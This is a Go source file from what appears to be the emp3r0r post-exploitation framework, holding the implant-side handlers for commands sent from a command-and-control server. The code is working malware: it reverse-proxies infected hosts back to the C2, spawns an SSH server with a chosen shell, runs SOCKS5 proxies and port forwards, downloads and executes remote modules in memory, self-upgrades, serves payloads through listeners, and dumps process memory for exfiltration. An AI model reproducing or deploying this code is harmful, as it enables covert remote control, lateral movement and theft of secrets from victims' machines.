package agent

import (
	"context"
	"encoding/json"
	"fmt"
	"log"
	"os"
	"path/filepath"
	"runtime"
	"strconv"
	"strings"
	"time"

	"github.com/jm33-m0/emp3r0r/core/internal/def"
	"github.com/jm33-m0/emp3r0r/core/internal/transport"
	"github.com/jm33-m0/emp3r0r/core/lib/crypto"
	"github.com/jm33-m0/emp3r0r/core/lib/listener"
	"github.com/jm33-m0/emp3r0r/core/lib/util"
	"github.com/spf13/cobra"
)

// runListDir implements !ls --path <path>
func runListDir(cmd *cobra.Command, args []string) {
	path, _ := cmd.Flags().GetString("path")
	if path == "" {
		C2RespPrintf(cmd, "Error: args error\n")
		return
	}
	var listPath string
	switch path {
	case ".":
		cwd, err := os.Getwd()
		if err != nil {
			C2RespPrintf(cmd, "Error: %v\n", err)
			return
		}
		listPath = cwd
	default:
		absPath, err := filepath.Abs(path)
		if err != nil {
			C2RespPrintf(cmd, "Error: %v\n", err)
			return
		}
		listPath = absPath
	}
	entries, err := os.ReadDir(listPath)
	if err != nil {
		C2RespPrintf(cmd, "Error: cant read dir %s: %v\n", listPath, err)
		return
	}
	lines := []string{listPath}
	for _, entry := range entries {
		if entry.IsDir() {
			lines = append(lines, fmt.Sprintf("%s/", entry.Name()))
		} else {
			lines = append(lines, entry.Name())
		}
	}
	C2RespPrintf(cmd, "%s", strings.Join(lines, "\n"))
}

// runStat implements !stat --path <path>
func runStat(cmd *cobra.Command, args []string) {
	path, _ := cmd.Flags().GetString("path")
	if path == "" {
		C2RespPrintf(cmd, "Error: args error\n")
		return
	}
	fi, err := os.Stat(path)
	if err != nil || fi == nil {
		C2RespPrintf(cmd, "Error: cant stat file %s: %v\n", path, err)
		return
	}
	fstat := &util.FileStat{
		Name:       util.FileBaseName(path),
		Size:       fi.Size(),
		Checksum:   crypto.SHA256SumFile(path),
		Permission: fi.Mode().String(),
	}
	data, err := json.Marshal(fstat)
	if err != nil {
		C2RespPrintf(cmd, "Error: cant marshal file info %s: %v\n", path, err)
		return
	}
	C2RespPrintf(cmd, "%s", string(data))
}

// runBring2CC implements !bring2cc --addr <target> --kcp <on/off>
func runBring2CC(cmd *cobra.Command, args []string) {
	addr, _ := cmd.Flags().GetString("addr")
	kcp, _ := cmd.Flags().GetString("kcp")
	if addr == "" {
		C2RespPrintf(cmd, "Error: no address\n")
		return
	}
	useKCP := kcp == "on"
	msg := fmt.Sprintf("Bring2CC: Reverse proxy for %s finished\n", addr)

	hasInternet := transport.TestConnectivity(def.CCAddress, RuntimeConfig.C2TransportProxy)
	isProxyOK := transport.IsProxyOK(RuntimeConfig.C2TransportProxy, def.CCAddress)
	if !hasInternet && !isProxyOK {
		C2RespPrintf(cmd, "Error: We don't have any internet to share\n")
		return
	}
	for p, cancelfunc := range ReverseConns {
		if addr == p {
			cancelfunc()
		}
	}
	targetAddrWithPort := fmt.Sprintf("%s:%s", addr, RuntimeConfig.Bring2CCReverseProxyPort)
	ctx, cancel := context.WithCancel(context.Background())
	kcpListenPort := fmt.Sprintf("%d", util.RandInt(10000, 60000))
	if useKCP {
		targetAddrWithPort = fmt.Sprintf("127.0.0.1:%s", kcpListenPort)
		kcpServerAddr := fmt.Sprintf("%s:%s", addr, RuntimeConfig.KCPServerPort)
		go transport.KCPTunClient(kcpServerAddr, kcpListenPort, RuntimeConfig.Password, def.MagicString, ctx, cancel)
		util.TakeABlink()
	}
	proxyPort, err := strconv.Atoi(RuntimeConfig.AgentSocksServerPort)
	if err != nil {
		C2RespPrintf(cmd, "Error: %v\n", err)
		cancel()
		return
	}
	err = transport.SSHReverseProxyClient(targetAddrWithPort, RuntimeConfig.Password, proxyPort, &ReverseConns, def.ProxyServer, ctx, cancel)
	if err != nil {
		C2RespPrintf(cmd, "%v\n", err)
		return
	}
	C2RespPrintf(cmd, "%s", msg)
}

// runSSHD implements !sshd --shell <shell> --port <port> --args <args>
func runSSHD(cmd *cobra.Command, args []string) {
	shell, _ := cmd.Flags().GetString("shell")
	port, _ := cmd.Flags().GetString("port")
	sshdArgs, _ := cmd.Flags().GetStringSlice("args")
	if shell == "" || port == "" {
		C2RespPrintf(cmd, "Error: args error\n")
		return
	}
	log.Printf("Got sshd request: %v", args)
	errChan := make(chan error)
	go func() {
		errChan <- SSHD(shell, port, sshdArgs)
	}()
	for !transport.IsPortOpen("127.0.0.1", port) {
		time.Sleep(50 * time.Millisecond)
	}
	select {
	case err := <-errChan:
		if err != nil {
			C2RespPrintf(cmd, "Error: %v\n", err)
		} else {
			C2RespPrintf(cmd, "success\n")
		}
	case <-time.After(3 * time.Second):
		C2RespPrintf(cmd, "SSHD started successfully\n")
	}
}

// runProxy implements !proxy --mode <mode> --addr <address>
func runProxy(cmd *cobra.Command, args []string) {
	mode, _ := cmd.Flags().GetString("mode")
	addr, _ := cmd.Flags().GetString("addr")
	if mode == "" || addr == "" {
		C2RespPrintf(cmd, "Error: args error\n")
		return
	}
	log.Printf("Got proxy request: %v", args)
	err := Socks5Proxy(mode, addr)
	if err != nil {
		C2RespPrintf(cmd, "Error: Failed to start Socks5Proxy: %v\n", err)
		return
	}
	C2RespPrintf(cmd, "Socks5Proxy server ready with username %s and password %s\n",
		RuntimeConfig.ShadowsocksLocalSocksPort, RuntimeConfig.Password)
}

// runPortFwd implements !port_fwd --to <target> --shID <session_id> --operation <operation> --timeout <timeout>
func runPortFwd(cmd *cobra.Command, args []string) {
	to, _ := cmd.Flags().GetString("to")
	sessionID, _ := cmd.Flags().GetString("shID")
	operation, _ := cmd.Flags().GetString("operation")
	timeout, _ := cmd.Flags().GetInt("timeout")
	if to == "" || sessionID == "" || operation == "" {
		C2RespPrintf(cmd, "Error: Invalid command\n")
		return
	}
	errChan := make(chan error)
	switch operation {
	case "stop":
		if pf, exist := PortFwds[sessionID]; exist {
			pf.Cancel()
			C2RespPrintf(cmd, "Warning: port mapping %s stopped\n", pf.Addr)
			return
		}
		C2RespPrintf(cmd, "Error: port mapping not found\n")
	case "reverse":
		go func() {
			errChan <- PortFwd(to, sessionID, "tcp", true, 0)
		}()
	default:
		go func() {
			errChan <- PortFwd(to, sessionID, operation, false, timeout)
		}()
	}
	select {
	case err := <-errChan:
		if err != nil {
			C2RespPrintf(cmd, "Error: %v\n", err)
		} else {
			C2RespPrintf(cmd, "Port forwarding started successfully\n")
		}
	case <-time.After(3 * time.Second):
		C2RespPrintf(cmd, "Port forwarding started successfully\n")
	}
}

// runDeletePortFwd implements !delete_portfwd --id <session_id>
func runDeletePortFwd(cmd *cobra.Command, args []string) {
	id, _ := cmd.Flags().GetString("id")
	if id == "" {
		return
	}
	for sessionID, session := range PortFwds {
		if sessionID == id {
			session.Cancel()
		}
	}
	C2RespPrintf(cmd, "")
}

// runUtils implements !utils --checksum <checksum> --download_addr <download_addr>
func runUtils(cmd *cobra.Command, args []string) {
	checksum, _ := cmd.Flags().GetString("checksum")
	downloadAddr, _ := cmd.Flags().GetString("download_addr")
	if checksum == "" {
		C2RespPrintf(cmd, "Error: args error\n")
		return
	}
	out := VaccineHandler(downloadAddr, checksum)
	if out != "[+] Utils have been successfully installed" {
		C2RespPrintf(cmd, "Error: %s\n", out)
		return
	}
	C2RespPrintf(cmd, "%s\n", out)
}

// runCustomModule implements !custom_module --mod_name <name> --exec <command> --env <env> --checksum <checksum> --in_mem <bool> --type <payload_type> --file_to_download <file> --download_addr <addr>
func runCustomModule(cmd *cobra.Command, args []string) {
	modName, _ := cmd.Flags().GetString("mod_name")
	execCmd, _ := cmd.Flags().GetString("exec")
	checksum, _ := cmd.Flags().GetString("checksum")
	inMem, _ := cmd.Flags().GetBool("in_mem")
	payloadType, _ := cmd.Flags().GetString("type")
	fileToDownload, _ := cmd.Flags().GetString("file_to_download")
	env, _ := cmd.Flags().GetString("env")
	downloadAddr, _ := cmd.Flags().GetString("download_addr")
	if modName == "" || checksum == "" {
		C2RespPrintf(cmd, "Error: args error\n")
		return
	}
	envParsed := strings.Split(env, ",")
	out := moduleHandler(downloadAddr, fileToDownload, payloadType, modName, checksum, execCmd, envParsed, inMem)
	C2RespPrintf(cmd, "%s\n", out)
}

// runUpdateAgent implements !upgrade_agent --checksum <checksum>
func runUpdateAgent(cmd *cobra.Command, args []string) {
	checksum, _ := cmd.Flags().GetString("checksum")
	if checksum == "" {
		C2RespPrintf(cmd, "Error: args error\n")
		return
	}
	out := Upgrade(checksum)
	C2RespPrintf(cmd, "%s\n", out)
}

// runListener implements !listener --listener <listener> --port <port> --payload <payload> --compression <on/off> --passphrase <passphrase>
func runListener(cmd *cobra.Command, args []string) {
	listenerType, _ := cmd.Flags().GetString("listener")
	port, _ := cmd.Flags().GetString("port")
	payload, _ := cmd.Flags().GetString("payload")
	compression, _ := cmd.Flags().GetString("compression")
	passphrase, _ := cmd.Flags().GetString("passphrase")
	if payload == "" {
		C2RespPrintf(cmd, "Error: payload not specified\n")
		return
	}
	log.Printf("Got listener request: %v", args)
	errChan := make(chan error)
	switch listenerType {
	case "http_aes_compressed":
		go func() {
			errChan <- listener.HTTPAESCompressedListener(payload, port, passphrase, compression == "on")
		}()
	case "http_bare":
		go func() {
			errChan <- listener.HTTPBareListener(payload, port)
		}()
	}
	select {
	case err := <-errChan:
		if err != nil {
			C2RespPrintf(cmd, "Error: %v\n", err)
		} else {
			C2RespPrintf(cmd, "Listener started successfully\n")
		}
	case <-time.After(3 * time.Second):
		C2RespPrintf(cmd, "Listener started successfully\n")
	}
}

// runFileServer implements !file_server --port <port> --switch <on/off>
func runFileServer(cmd *cobra.Command, args []string) {
	port, _ := cmd.Flags().GetString("port")
	serverSwitch, _ := cmd.Flags().GetString("switch")
	portInt, err := strconv.Atoi(port)
	if err != nil {
		C2RespPrintf(cmd, "Error parsing port: %v\n", err)
		return
	}
	if serverSwitch == "on" {
		if FileServerCtx != nil {
			FileServerCancel()
		}
		FileServerCtx, FileServerCancel = context.WithCancel(context.Background())
		go FileServer(portInt, FileServerCtx, FileServerCancel)
		C2RespPrintf(cmd, "File server on port %s is now %s\n", port, serverSwitch)
	} else {
		if FileServerCtx != nil {
			FileServerCancel()
		}
		C2RespPrintf(cmd, "File server on port %s is now %s\n", port, serverSwitch)
	}
}

// runFileDownloader implements !file_downloader --download_addr <url> --path <path> --checksum <checksum>
func runFileDownloader(cmd *cobra.Command, args []string) {
	url, _ := cmd.Flags().GetString("download_addr")
	path, _ := cmd.Flags().GetString("path")
	checksum, _ := cmd.Flags().GetString("checksum")
	if url == "" || path == "" {
		C2RespPrintf(cmd, "Error: args error\n")
		return
	}
	downloadPath := fmt.Sprintf("%s/%s", RuntimeConfig.AgentRoot, util.FileBaseName(path))
	err := RequestAndDownloadFile(url, path, downloadPath, checksum)
	if err != nil {
		C2RespPrintf(cmd, "Error: %v\n", err)
		return
	}
	C2RespPrintf(cmd, "File downloaded to %s\n", path)
}

// runMemDump implements !mem_dump --pid <pid>
func runMemDump(cmd *cobra.Command, args []string) {
	pid, _ := cmd.Flags().GetInt("pid")
	if pid == 0 {
		C2RespPrintf(cmd, "Error: invalid PID\n")
		return
	}
	outPath := fmt.Sprintf("%s/%d", RuntimeConfig.AgentRoot, pid)
	err := os.MkdirAll(outPath, 0700)
	if err != nil {
		C2RespPrintf(cmd, "Error: %v\n", err)
		return
	}
	tarball := fmt.Sprintf("%d.tar.xz", pid)
	switch runtime.GOOS {
	case "windows":
		tarball = strings.ReplaceAll(tarball, "\\", "/")
		filePath := fmt.Sprintf("%s/%d.bin", outPath, pid)
		err = util.MiniDumpProcess(pid, filePath)
		if err != nil {
			C2RespPrintf(cmd, "Error (minidump): %v\n", err)
			return
		}
	case "linux":
		dumpedData, err := util.DumpProcMem(pid)
		if err != nil {
			C2RespPrintf(cmd, "Error: %v\n", err)
			return
		}
		for base, data := range dumpedData {
			filePath := fmt.Sprintf("%s/%d_%d.bin", outPath, pid, base)
			err = os.WriteFile(filePath, data, 0600)
			if err != nil {
				C2RespPrintf(cmd, "Error: %v\n", err)
				return
			}
		}
	}
	err = os.Chdir(RuntimeConfig.AgentRoot)
	if err != nil {
		C2RespPrintf(cmd, "Error: %v\n", err)
		return
	}
	err = util.TarXZ(fmt.Sprintf("%d", pid), tarball)
	if err != nil {
		C2RespPrintf(cmd, "Error: %v\n", err)
		return
	}
	defer os.RemoveAll(outPath)
	C2RespPrintf(cmd, "%s\n", tarball)
}
